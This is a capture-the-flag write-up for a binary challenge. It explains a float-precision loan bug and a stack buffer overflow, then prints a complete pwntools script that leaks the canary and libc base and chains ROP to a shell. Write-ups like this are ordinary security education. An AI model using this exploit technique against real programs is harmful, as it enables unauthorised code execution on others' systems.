## Table of Contents
- [Audit/no-name minor](#Auditno-nameminor)

# Audit/no-name minor

This was a challenge similar to the one I created for Battle of Hackers 2024 so we solved it relatively fast. The challenge provides us with a binary that presents a menu that allows the user to borrow a loan, repay the loan, mining for money, buy a name and change name. 

![image](https://github.com/user-attachments/assets/90df0d94-6313-47c3-98f0-9376ca855de0)

The goal is to get a name. But 

- To buy a name, you need to have money.
- To have money you cannot simply mine, cause it will take a lot of time.
- So you need to loan and then repay them.

The vulnerability lies in the way the program keeps track of the user's loan.

<details>
<summary>Source Code</summary>

```c
// Miner struct
struct MinerAccount {
	float cash;
	float debt_balance;
	int mining_attempts;
	char name[0x20];
};

// Loan function
void loan(struct MinerAccount *account) {
	uint32_t amount = 0;
    
	printf("How much loan would you like to request?\n");
	if(scanf("%d", &amount) != 1) {
    	printf("Invalid input\n");
    	return;
	}
    
	if(account->debt_balance + amount > MAX_LOAN) {
    	printf("Loan limit exceeded\n");
    	return;
	}

	account->cash += amount;
	account->debt_balance += amount;

	printf("Current cash: $%.2f\n", account->cash);
	printf("Debt balance: $%.2f\n", account->debt_balance);
}
```
</details>

The user's loan is defined as a float, which can be subjected to **floating point inaccuracy.**  A float is 32 bit and it has 1 bit for sign, 23 bit for mantissa and 8 bit for exponent. For integers, the inaccuracy starts at 2^24 (16,777,216). In other words, all integers can be represented as floats up to 2^24 but not beyond that. Specifically, in the range of 2^24 to 2^25, float does not support odd numbers, only even numbers.

<details>
<summary>Proof of Concept</summary>

### Proof of Concept

![image](https://github.com/user-attachments/assets/e75708b0-e383-4faa-bb98-5bbff0919289)

Heres a simple C program that demonstrates this

![image](https://github.com/user-attachments/assets/592a968a-5ee3-4b0d-a6b0-281de6eae7fa)

This is the output

</details>

### Exploiting the Program

Now, we just need to borrow money until 16777216, buy the name, and borrow loan of size $1 until we eventually are able to repay our loan.

![image](https://github.com/user-attachments/assets/ad4d18bc-c5af-45d3-b630-8f4067bb0321)

Buying the name

![image](https://github.com/user-attachments/assets/318be9bc-d5d2-419d-a6cb-637534776cb4)

After borrowing $1

### Buffer Overflow

<details>
<summary>Source Code</summary>

```c
#define MAX_BUF 0x200
struct MinerAccount {
	float cash;
	float debt_balance;
	int mining_attempts;
	char name[0x20];
};

void change_name(struct MinerAccount *account) {
	if (has_name_rights != 1) {
    	printf("You do not have the right to change your name.\n");
    	printf("Please purchase a name to gain the rights to rename your no-name.\n");
    	return;
	}
	if(account->debt_balance != 0) {
    	printf("You still have debts to repay.\n");
    	printf("Pay off your debts to rename your no-name.\n");
    	return;
	}
	printf("Enter new name.\n");
	read(0, account->name, MAX_BUF);

	printf("Name updated successfully.\n");
}

int main() {
	initialize();
	srand(time(NULL));
	struct MinerAccount account = {0, 0, 0, "no-name"};
	while(1) {
    	int choice;
    	printf("===========================\n");
    	printf("Welcome to %s\n", account.name);
    	printf("Current cash: $%.2f\n", account.cash);
    	printf("Debt balance: $%.2f\n", account.debt_balance);
    	printf("===========================\n");

    	printf("1. Loan\n2. Repayment\n3. Mining\n4. Buy Name\n5. Change Name\n6. Exit\nChoose an action.\n");
    	scanf("%d", &choice);
    	switch(choice) {
        	case 1:
            	loan(&account);
            	break;
        	case 2:
            	repayment(&account);
            	break;
        	case 3:
            	mining(&account);
            	break;
        	case 4:
            	buy_name(&account);
            	break;
        	case 5:
            	change_name(&account);
            	break;
        	case 6:
            	return 0;
        	default:
            	printf("Invalid choice\n");
            	break;
    	}
	}
	return 0;
}
```
</details>

The name in MinerAccount object was assigned to only 0x20 size, but in change_name function we can change up until 0x200. With the help of the printf() in main, we are able to leak the stack canary and libc address after overwriting enough bytes using read(). Putting it all together, we get 

1) We loan 16777216 money
2) Then we buy name so our money no 16777216 - 1337
3) Then if we loan 1 dollar each time, our cash increase, but debt stays the same. So we loan 1 dollar for 1337 times
4) Then can repay all debt
5) Now start the leaking process through name
6) Leak canary
7) Leak libc_start_main address
8) Proceed will rop chain to system

<details>
<summary>Exploit Script</summary>

```py
from pwn import *

exe = './prob'
elf = context.binary = ELF(exe, checksec = False)
io = elf.process()

context.log_level = 'info'

#---------------------------------------------------------------------
sleep(1)
#io.recvuntil(b'Choose an action.\n')
io.sendline(b'1')
#io.recvuntil(b'How much loan would you like to request?\n')
io.sendline(b'16777216')

#io.recvuntil(b'Choose an action.\n')
io.sendline(b'4')


for i in range(1337):
#	io.recvuntil(b'Choose an action.\n')
	io.sendline(b'1')
#	io.recvuntil(b'How much loan would you like to request?\n')
	io.sendline(b'1')

io.recvuntil(b'Choose an action.\n')
io.sendline(b'2')
io.recvuntil(b'How much would you like to repay?\n')
io.sendline(b'16777216')

io.recvuntil(b'Choose an action.')
io.sendline(b'5')
io.recvuntil(b'Enter new name.')
io.sendline(b'A'*44)

io.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n')
canary = io.recv(7).strip()
canary = b'\x00'+canary
canary = unpack(canary)
info(f'Canary: {hex(canary)}')

io.recvuntil(b'Choose an action.')
io.sendline(b'5')
io.recvuntil(b'Enter new name.')
io.sendline(b'A'*59)
io.recvuntil(b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n')
libc_add = unpack(io.recv(6).strip().ljust(8,b'\x00'))
info(f'libc leaked : {hex(libc_add)}')

io.recvuntil(b'Choose an action.')
io.sendline(b'5')
io.recvuntil(b'Enter new name.')

libc = ELF('./libc.so.6')
libc.address = libc_add-0x29d90
rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\x00')))

payload = b'A'*44
payload += p64(canary)
payload += b'A'*8
payload += p64(libc.address + 0x0000000000029cd6)
payload += rop.chain()
io.sendline(payload)

#--------------------------------------------------------------------
io.interactive()
```
</details>

# Rev/CS1338: Script Programming
